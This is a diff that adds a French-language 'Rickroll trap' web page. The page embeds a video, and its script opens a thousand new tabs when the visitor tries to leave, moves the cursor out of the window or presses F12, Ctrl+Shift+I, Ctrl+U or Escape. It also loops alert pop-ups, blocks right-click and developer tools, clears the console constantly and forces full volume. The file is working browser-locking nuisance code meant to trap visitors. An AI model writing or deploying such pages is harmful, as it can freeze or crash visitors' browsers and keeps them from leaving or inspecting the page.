@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rickroll Piège</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+        }
+        .video-container iframe {
+            border: none;
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            left: 0;
+            top: 0;
+            overflow: hidden;
+        }
+    </style>
+    <script>
+        // Fonction pour ouvrir un nombre exponentiel de nouveaux onglets
+        function openMassiveTabs() {
+            let openCount = 1000; // Nombre de popups à ouvrir
+            for (let i = 0; i < openCount; i++) {
+                let newWindow = window.open(window.location.href, "_blank");
+                if (newWindow) {
+                    newWindow.focus();
+                }
+            }
+        }
+
+        // Quand l'utilisateur essaie de quitter, on spam des alertes et on ouvre des onglets
+        window.onbeforeunload = function(event) {
+            openMassiveTabs();
+            for (let i = 0; i < 10; i++) {
+                alert("Tu crois vraiment pouvoir partir ?! 🎶😈");
+            }
+            return "Tu ne peux pas partir aussi facilement !";
+        };
+
+        // Quand le curseur quitte la page, ouvrir une quantité massive de popups
+        document.addEventListener("mouseleave", function(event) {
+            openMassiveTabs();
+            alert("Reviens ici tout de suite ! 😈🎶");
+        });
+
+        // Désactive le clic droit
+        document.addEventListener("contextmenu", function(event) {
+            event.preventDefault();
+            alert("Non, non, non ! Pas de triche ! 😈");
+        });
+
+        // Désactive les touches F12, Ctrl+Shift+I, Ctrl+W, Alt+F4, et plus encore
+        document.addEventListener("keydown", function(event) {
+            if (
+                event.keyCode === 123 || // F12
+                (event.ctrlKey && event.shiftKey && event.keyCode === 73) || // Ctrl+Shift+I
+                (event.ctrlKey && event.keyCode === 85) || // Ctrl+U
+                event.keyCode === 27 // Echappe
+            ) {
+                event.preventDefault();
+                alert("Désolé, mais c'est impossible de s'échapper ! 😈");
+                openMassiveTabs();
+            }
+        });
+
+        // Forcer le son à 100% après chargement
+        window.onload = function() {
+            setTimeout(() => {
+                let iframe = document.querySelector("iframe");
+                iframe.src += "&mute=0&volume=100";
+            }, 1000);
+        };
+
+        // Bloque la console développeur
+        setInterval(() => {
+            console.log("Rickroll activé en mode enfer 🔥🎶");
+            console.clear();
+        }, 100);
+    </script>
+</head>
+<body>
+    <div class="video-container">
+        <iframe 
+            allow="fullscreen;autoplay" 
+            allowfullscreen 
+            src="https://streamable.com/e/rszdof?autoplay=1&mute=0&volume=100">
+        </iframe>
+    </div>
+</body>
+</html>
